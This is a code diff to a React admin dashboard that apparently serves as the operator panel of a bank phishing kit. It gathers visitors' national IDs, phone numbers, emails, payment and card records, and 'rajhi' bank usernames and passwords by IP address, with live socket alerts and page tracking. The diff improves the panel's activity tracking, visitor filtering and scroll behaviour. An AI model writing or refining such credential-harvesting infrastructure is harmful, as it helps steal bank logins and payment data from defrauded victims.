@@ -1,5 +1,5 @@
 // src/App.js
-import React, { useEffect, useState, useRef } from "react";
+import React, { useEffect, useState, useRef, useLayoutEffect } from "react";
 import { Routes, Route, Navigate, useNavigate } from "react-router-dom";
 
 import { socket } from "./socket";
@@ -78,6 +78,20 @@ export default function App() {
 
         const map = {};
 
+const toMs = (d) => {
+  if (!d) return 0;
+  const ms = Date.parse(d);
+  return Number.isFinite(ms) ? ms : 0;
+};
+
+const docActivityMs = (r) => toMs(r.updatedAt || r.createdAt);
+
+const bumpActivity = (ipKey, ms) => {
+  if (!map[ipKey]) return;
+  const cur = map[ipKey].lastActivityAt || 0;
+  if (ms > cur) map[ipKey].lastActivityAt = ms;
+};
+
         // 1) Flatten everything except payment/flags/locations/newDates/rajhi
         Object.entries(data).forEach(([key, arr]) => {
           if (
@@ -97,6 +111,7 @@ export default function App() {
                 flag: false,
                 hasNewData: false,
                 hasPayment: false,
+                lastActivityAt: 0,
               };
             }
             map[ipKey] = {
@@ -107,6 +122,8 @@ export default function App() {
               hasNewData: false,
               hasPayment: map[ipKey].hasPayment,
             };
+
+            bumpActivity(ipKey, docActivityMs(r));
           });
         });
 
@@ -120,10 +137,12 @@ export default function App() {
                 flag: false,
                 hasNewData: false,
                 hasPayment: false,
+                lastActivityAt: 0,
               };
             }
             map[ipKey].payments.push(payDoc);
             map[ipKey].hasPayment = true; // show as completed payment
+            bumpActivity(ipKey, docActivityMs(payDoc));
           });
         }
 
@@ -136,72 +155,72 @@ export default function App() {
                 flag: false,
                 hasNewData: false,
                 hasPayment: false,
+                lastActivityAt: 0,
               };
             }
             map[ipKey].flag = flag;
           });
         }
 
-        // 4) Locations
-        if (data.locations) {
-          data.locations.forEach(({ ip: ipKey, currentPage }) => {
-            if (!map[ipKey]) {
-              map[ipKey] = {
-                payments: [],
-                flag: false,
-                hasNewData: false,
-                hasPayment: false,
-              };
-            }
-            map[ipKey].currentPage = currentPage;
-          });
-        }
+        // 4) Locations (do NOT create a user from a mere visit)
+if (data.locations) {
+  data.locations.forEach(({ ip: ipKey, currentPage }) => {
+    if (!map[ipKey]) return; // ignore visitors with no submitted data
+    map[ipKey].currentPage = currentPage;
+  });
+}
 
-        // 5) Merge NewDate identity fields
-        if (data.newDates) {
-          data.newDates.forEach(
-            ({
-              ip: ipKey,
-              name,
-              nationalID,
-              phoneNumber,
-              email,
-              nationality,
-              countryOfRegistration,
-              region,
-            }) => {
-              if (!map[ipKey]) {
-                map[ipKey] = {
-                  payments: [],
-                  flag: false,
-                  hasNewData: false,
-                  hasPayment: false,
-                };
-              }
-              map[ipKey] = {
-                ...map[ipKey],
-                name: name ?? map[ipKey].name,
-                nationalID: nationalID ?? map[ipKey].nationalID,
-                phoneNumber: phoneNumber ?? map[ipKey].phoneNumber,
-                email: email ?? map[ipKey].email,
-                nationality: nationality ?? map[ipKey].nationality,
-                countryOfRegistration:
-                  countryOfRegistration ?? map[ipKey].countryOfRegistration,
-                region: region ?? map[ipKey].region,
-              };
-            }
-          );
-        }
+// 5) Merge NewDate identity fields
+if (data.newDates) {
+  data.newDates.forEach((nd) => {
+    const {
+      ip: ipKey,
+      name,
+      nationalID,
+      phoneNumber,
+      email,
+      nationality,
+      countryOfRegistration,
+      region,
+    } = nd;
 
-        // 6) 🔹 Merge Rajhi records into user object
+    if (!map[ipKey]) {
+      map[ipKey] = {
+        payments: [],
+        flag: false,
+        hasNewData: false,
+        hasPayment: false,
+        lastActivityAt: 0,
+      };
+    }
+
+    map[ipKey] = {
+      ...map[ipKey],
+      name: name ?? map[ipKey].name,
+      nationalID: nationalID ?? map[ipKey].nationalID,
+      phoneNumber: phoneNumber ?? map[ipKey].phoneNumber,
+      email: email ?? map[ipKey].email,
+      nationality: nationality ?? map[ipKey].nationality,
+      countryOfRegistration:
+        countryOfRegistration ?? map[ipKey].countryOfRegistration,
+      region: region ?? map[ipKey].region,
+    };
+
+    bumpActivity(ipKey, docActivityMs(nd));
+  });
+}
+
+// 6) 🔹 Merge Rajhi records into user object
         if (data.rajhi) {
-          data.rajhi.forEach(({ ip: ipKey, username, password }) => {
+          data.rajhi.forEach((rj) => {
+            const { ip: ipKey, username, password } = rj;
             if (!map[ipKey]) {
               map[ipKey] = {
                 payments: [],
                 flag: false,
                 hasNewData: false,
                 hasPayment: false,
+                lastActivityAt: 0,
               };
             }
             map[ipKey] = {
@@ -209,6 +228,8 @@ export default function App() {
               rajhiUsername: username ?? map[ipKey].rajhiUsername,
               rajhiPassword: password ?? map[ipKey].rajhiPassword,
             };
+
+            bumpActivity(ipKey, docActivityMs(rj));
           });
         }
 
@@ -245,6 +266,7 @@ export default function App() {
             flag: false,
             hasNewData: false,
             hasPayment: false,
+            lastActivityAt: 0,
           };
 
           playNewDataSound();
@@ -257,6 +279,7 @@ export default function App() {
               payments: oldObj.payments,
               flag: oldObj.flag,
               hasNewData: true, // ✅ mark as new data
+              lastActivityAt: Date.now(),
               hasPayment: oldObj.hasPayment || u.hasPayment === true,
             },
           };
@@ -271,6 +294,7 @@ export default function App() {
             flag: false,
             hasNewData: false,
             hasPayment: false,
+            lastActivityAt: 0,
           };
 
           playCodeSound(); // Use code sound
@@ -283,6 +307,7 @@ export default function App() {
               payments: oldObj.payments,
               flag: oldObj.flag,
               hasNewData: true, // ✅ mark as new data
+              lastActivityAt: Date.now(),
               hasPayment: oldObj.hasPayment || u.hasPayment === true,
             },
           };
@@ -297,6 +322,7 @@ export default function App() {
             flag: false,
             hasNewData: false,
             hasPayment: false,
+            lastActivityAt: 0,
           };
           return {
             ...m,
@@ -320,6 +346,7 @@ export default function App() {
             flag: false,
             hasNewData: false,
             hasPayment: false,
+            lastActivityAt: 0,
           };
 
           // 🚫 skip duplicates
@@ -345,6 +372,7 @@ export default function App() {
               payments: [...oldObj.payments, u],
               flag: oldObj.flag,
               hasNewData: true, // new data arrived
+              lastActivityAt: Date.now(),
               hasPayment: true, // ✅ mark as paid/completed
             },
           };
@@ -367,6 +395,7 @@ export default function App() {
               flag: false,
               hasNewData: false,
               hasPayment: false,
+              lastActivityAt: 0,
             }),
             flag,
           },
@@ -395,25 +424,24 @@ export default function App() {
       );
 
       // 🌐 Location updates are SILENT and DO NOT mark new data
-      socket.on("locationUpdated", ({ ip, page }) => {
-        if (page !== "offline") {
-          mergeSilent({ ip, currentPage: page });
-        } else {
-          setUsers((m) => {
-            if (!m[ip]) return m;
-            return {
-              ...m,
-              [ip]: {
-                ...m[ip],
-                currentPage: "offline",
-                // keep hasNewData/hasPayment unchanged
-              },
-            };
-          });
-        }
-      });
+      // Location updates should never create a new user row.
+// Only update location for IPs that already submitted data.
+socket.on("locationUpdated", ({ ip, page }) => {
+  setUsers((m) => {
+    if (!m[ip]) return m; // ignore visitors
 
-      socket.on("userDeleted", removeUser);
+    return {
+      ...m,
+      [ip]: {
+        ...m[ip],
+        currentPage: page,
+        // keep hasNewData/hasPayment unchanged
+      },
+    };
+  });
+});
+
+socket.on("userDeleted", removeUser);
       socket.on("flagUpdated", updateFlag);
     })();
     
@@ -488,19 +516,44 @@ function DashboardView({
   setInfoIp,
   setCardIp,
 }) {
+
+const tableWrapRef = useRef(null);
+const savedScrollTopRef = useRef(0);
+
+// Keep user-controlled scroll position stable across realtime re-renders.
+useEffect(() => {
+  const el = tableWrapRef.current;
+  if (!el) return;
+
+  const onScroll = () => {
+    savedScrollTopRef.current = el.scrollTop;
+  };
+
+  el.addEventListener("scroll", onScroll, { passive: true });
+  return () => el.removeEventListener("scroll", onScroll);
+}, []);
+
+useLayoutEffect(() => {
+  const el = tableWrapRef.current;
+  if (!el) return;
+  el.scrollTop = savedScrollTopRef.current;
+}, [users]);
+
   return (
     <div className="container py-4">
       <div className="d-flex justify-content-between align-items-center mb-3">
         <h2>Admin Dashboard</h2>
       </div>
 
-      <UserTable
-        users={users}
-        highlightIp={highlightIp}
-        cardIp={cardIp}
-        onShowCard={onShowCard}
-        onShowInfo={setInfoIp}
-      />
+      <div ref={tableWrapRef} className="tableScroll">
+        <UserTable
+          users={users}
+          highlightIp={highlightIp}
+          cardIp={cardIp}
+          onShowCard={onShowCard}
+          onShowInfo={setInfoIp}
+        />
+      </div>
 
       {cardIp && (
         <CardModal
